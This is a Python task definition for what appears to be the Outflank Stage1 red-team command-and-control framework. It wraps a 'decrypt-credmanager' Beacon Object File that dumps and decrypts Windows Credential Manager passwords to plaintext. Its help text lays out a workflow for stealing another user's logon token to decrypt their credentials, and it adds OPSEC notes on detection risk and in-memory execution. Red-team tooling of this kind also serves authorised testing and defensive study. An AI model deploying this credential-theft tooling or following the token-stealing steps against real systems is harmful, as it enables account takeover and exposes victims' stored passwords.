from typing import List, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


class DecryptCredmanagerBOF(BaseBOFTask):
    def __init__(self):
        super().__init__("decrypt-credmanager", base_binary_name="decrypt-credmanager")

        self.parser.description = (
            "Enumerate and DECRYPT credentials stored in Windows Credential Manager for the current user. "
            "Uses CredEnumerateW + CryptUnprotectData to list credentials and extract passwords. "
            "Only decrypts credentials encrypted by the current user."
        )

        self.parser.add_argument(
            "--filter",
            "-f",
            default="",
            help="Optional filter string for credential target names (e.g., 'github.com'). Leave empty for all credentials."
        )

        self.parser.epilog = (
            "Example usage:\n"
            "  decrypt-credmanager                           # Decrypt all credentials\n"
            "  decrypt-credmanager -f github.com             # Filter by target name\n"
            "  decrypt-credmanager --filter domain           # Filter for domain credentials\n\n"
            "Notes:\n"
            "  - Runs in current user context (no admin required)\n"
            "  - Decrypts passwords using DPAPI (CryptUnprotectData)\n"
            "  - Only works for credentials encrypted by the current user\n"
            "  - Credentials encrypted by other users will fail to decrypt\n"
            "  - Uses standard CredEnumerateW and CryptUnprotectData APIs\n\n"
            "Admin workflow (other users' credentials):\n"
            "  Admin alone does not help: DPAPI ties each blob to the owning user's logon\n"
            "  secret. Run enum-stored-accounts to see which profiles hold Credential\n"
            "  Manager blobs, steal or create a token for that user (they must be logged\n"
            "  on, or you need their password/NT hash), then run decrypt-credmanager\n"
            "  under that token.\n\n"
            "Credential Types:\n"
            "  - GENERIC: Generic credentials (cmdkey /generic)\n"
            "  - DOMAIN_PASSWORD: Domain passwords (RDP, network shares)\n"
            "  - DOMAIN_CERTIFICATE: Certificate-based domain credentials\n"
            "  - DOMAIN_VISIBLE_PASSWORD: Domain passwords with visible UI\n"
            "  - GENERIC_CERTIFICATE: Generic certificate credentials\n\n"
            "Decryption:\n"
            "  - SUCCESS: Password will be displayed in plaintext\n"
            "  - FAILED: Credential was encrypted by different user or different context\n"
            "  - DPAPI can only decrypt data encrypted by the same user\n\n"
            "OPSEC Considerations:\n"
            "  - Uses documented Windows APIs (CredEnumerateW, CryptUnprotectData)\n"
            "  - No privileged operations required\n"
            "  - DPAPI decryption is a normal user operation\n"
            "  - Medium detection risk (credential access may be logged)\n"
            "  - No disk writes, all in-memory operations\n\n"
            "Security Note:\n"
            "  - Displays passwords in plaintext in beacon output\n"
            "  - Ensure secure communication channel\n"
            "  - Consider logging implications\n"
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)

        parser_arguments = self.parser.parse_args(arguments)

        # No specific validation needed - filter is optional string

    def _encode_arguments_bof(self, arguments: List[str]) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)

        # BOF expects: z (optional string filter)
        # If no filter provided, send empty string
        filter_str = parser_arguments.filter if parser_arguments.filter else ""

        if filter_str:
            return [
                (BOFArgumentEncoding.STR, filter_str)
            ]
        else:
            # Send empty arguments if no filter
            return []
